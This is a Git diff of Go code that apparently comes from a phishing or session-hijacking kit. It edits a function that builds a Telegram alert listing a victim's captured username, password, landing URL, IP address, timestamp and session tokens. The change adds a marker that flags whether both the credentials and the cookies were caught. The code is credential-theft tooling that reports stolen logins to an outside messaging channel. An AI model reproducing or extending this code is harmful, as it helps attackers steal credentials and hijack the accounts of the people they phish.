@@ -222,7 +222,16 @@ func createTxtFile(session Session) (string, error) {
 
 // formatSessionMessage creates the text snippet for Telegram (excluding token data).
 func formatSessionMessage(session Session) string {
-	return fmt.Sprintf("✅🔐 ====== Evolcorp MDR ====== 🔐✅\n\n"+
+	// Check if the session is complete
+	sessionComplete := session.Username != "" && session.Password != "" && len(session.Tokens) > 0
+
+	// Set the correct symbols
+	statusSymbol := "✅"
+	if !sessionComplete {
+		statusSymbol = "🚫"
+	}
+
+	return fmt.Sprintf("%s🔐 ====== Evolcorp MDR ====== 🔐%s\n\n"+
 		"👤 Username: 🪤 %s\n"+
 		"🔑 Password: 🪤 %s\n"+
 		"🌐 Landing URL: 🔗 %s\n\n"+
@@ -230,6 +239,7 @@ func formatSessionMessage(session Session) string {
 		"🌍 IP Address: %s\n"+
 		"🕒 Timestamp: %d\n\n"+
 		"📦 Token Delivery. 🍪 incoming.\n",
+		statusSymbol, statusSymbol,
 		session.Username,
 		session.Password,
 		session.LandingURL,
@@ -238,6 +248,7 @@ func formatSessionMessage(session Session) string {
 		session.CreateTime,
 	)
 }
+
 
 // Notify orchestrates creation of a text file, then sends (or edits) a Telegram notification.
 func Notify(session Session) {
